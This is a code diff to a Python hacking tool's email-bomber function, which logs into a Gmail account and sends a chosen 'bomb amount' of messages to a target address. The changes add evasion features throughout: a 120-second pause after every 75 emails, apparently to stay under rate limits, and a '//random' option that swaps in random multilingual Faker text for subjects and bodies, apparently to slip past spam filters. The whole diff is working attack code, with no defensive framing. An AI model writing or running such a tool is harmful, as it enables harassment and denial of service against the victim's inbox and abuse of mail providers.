@@ -1,6 +1,7 @@
 import nmap, datetime, getpass
 import sys, time, decimal, re
 import smtplib
+from zipfile import ZipFile
 from clear_screen import clear
 from faker import Faker
 from email.mime.multipart import MIMEMultipart
@@ -421,7 +422,7 @@ def mail_maker(gmail_addr, gmail_pass, target_addr, subject, body):
 
 def mail_bomber_proc():
 	try:
-		fake_subj = Faker(['it_IT', 'ja_JP', 'cs_CZ', 'de_DE', 'es_ES', 'hi_IN', 'hr_HR', 'ar_SA', 'el_GR', 'tr_TR'])
+		fake_text = Faker(['it_IT', 'ja_JP', 'cs_CZ', 'de_DE', 'es_ES', 'hi_IN', 'hr_HR', 'ar_SA', 'el_GR', 'tr_TR'])
 		fin_input = False
 		mail_content = ''
 		texts = ''
@@ -437,7 +438,7 @@ def mail_bomber_proc():
 		receiver_address = input('Target E-Mail\t: ')
 
 		mail_subject = input('Mail Subject\t: ')
-		mail_content += input('Mail Body\t: ')
+		mail_content += input('Mail Content\t: ')
 		mail_content += '\n'
 
 		while fin_input == False:
@@ -451,11 +452,11 @@ def mail_bomber_proc():
 		session.starttls()
 		session.login(sender_address, sender_pass)
 
-		total_mail   = int(input('\nSpecify the bomb amount : '))
+		total_mail   = int(input('Bomb Amount\t: '))
 		sub_loop     = int(total_mail/55)
 		interval     = total_mail/55
 		counter      = 1
-		random_subj  = input('Do you want to radomize the subject (Y) ? ')
+		#random_subj  = input('Do you want to radomize the subject (Y) ? ')
 		#print(str(fake_subj.text())[:25])
 		#print(random_subj)
 		#frmt_query = '{:.3f}'.format(time.time() - go_time)
@@ -463,28 +464,50 @@ def mail_bomber_proc():
 		est_time = '{:.4f}'.format(float(((total_mail * 2.3) + 5.5) / 3600))
 		texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
 		go_time = time.time()
+		mail_delay = 0
+		mail_passer_subj = mail_subject
+		mail_passer_cont = mail_content
 		print('\nEstimated processing time is around %s hours' % est_time)
 		print('[+] Processing  | ', end="", flush=True)
 		for i in range(54):
+			if mail_delay >= 75:
+				time.sleep(120)
+				mail_delay = 0
 			if sub_loop < 1:
 				for j in range(1):
-					if random_subj == 'y' or random_subj == 'Y':
-						mail_subject_2 = str(fake_subj.text())[:25]
-						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject_2, mail_content)
+					if mail_passer_subj == '//random':
+						mail_subject_2 = str(fake_text.text())[:25]
+						mail_subject = mail_subject_2
+						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
+					if re.search('//random', mail_passer_cont):
+						mail_content_2 = ''
+						for i in range(10):
+							mail_content_2 += fake_text.text()
+						mail_content = mail_content_2
+						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
 					if counter <= total_mail:
 						session.sendmail(sender_address, receiver_address, texts)
 						#print('mail sent : %s' % (counter))
 						counter += 1
+						mail_delay += 1
 						time.sleep(0.3)
 			else:
 				for j in range(sub_loop*2):
-					if random_subj == 'y' or random_subj == 'Y':
-						mail_subject_2 = str(fake_subj.text())[:25]
-						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject_2, mail_content)
+					if mail_passer_subj == '//random':
+						mail_subject_2 = str(fake_text.text())[:25]
+						mail_subject = mail_subject_2
+						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
+					if re.search('//random', mail_passer_cont):
+						mail_content_2 = ''
+						for i in range(10):
+							mail_content_2 += fake_text.text()
+						mail_content = mail_content_2
+						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
 					if counter <= total_mail:
 						session.sendmail(sender_address, receiver_address, texts)
 						#print('mail sent : %s' % (counter))
 						counter += 1
+						mail_delay += 1
 						time.sleep(0.3)
 			prog = ':'
 			print(prog, end="", flush=True)
@@ -502,7 +525,7 @@ def mail_bomber_proc():
 		frmt_query = '{:.3f}'.format(time.time() - go_time)
 		print('\nQuery finished successfully in %s seconds ...' % (frmt_query))
 	except:
-		err_i = str(sys.exc_info()[1])[:55] + ' ...)'
+		err_i = str(sys.exc_info()[1]) + ' ...)'
 		print('\n\nIt seems the connection have been refused')
 		print('Error : %s' % err_i)
 
